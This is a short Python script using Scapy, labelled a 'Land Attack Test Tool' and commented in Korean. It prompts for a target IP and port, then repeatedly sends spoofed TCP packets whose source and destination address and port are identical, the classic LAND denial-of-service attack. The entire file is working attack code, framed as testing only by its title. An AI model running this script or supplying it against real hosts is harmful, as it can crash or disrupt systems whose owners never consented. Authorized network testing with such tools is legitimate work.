#!/usr/bin/python
# -*- coding: utf-8 -*-

from scapy.all import *
import time

def main():
    print("=== Land Attack Test Tool ===")

    # 사용자 입력 받기
    target_ip = input("Enter Target IP (e.g., 192.168.0.1): ").strip()
    target_port = int(input("Enter Target Port (e.g., 80): ").strip())
    packets_count = int(input("Enter number of packets to send (default: 5): ").strip() or 5)
    delay = float(input("Enter delay between packets (in seconds, default: 1): ").strip() or 1)

    try:
        # Land Attack 패킷 생성
        pkt = IP(src=target_ip, dst=target_ip) / TCP(sport=target_port, dport=target_port)

        print(f"\n[INFO] Starting Land Attack test on {target_ip}:{target_port}...\n")
        for i in range(packets_count):
            send(pkt, verbose=False)  # 패킷 전송
            print(f"[INFO] Packet {i+1}/{packets_count} sent.")
            time.sleep(delay)  # 지연 시간

        print("\n[INFO] All packets sent. Test completed.")
    
    except Exception as e:
        print(f"[ERROR] An error occurred: {e}")

if __name__ == "__main__":
    main()
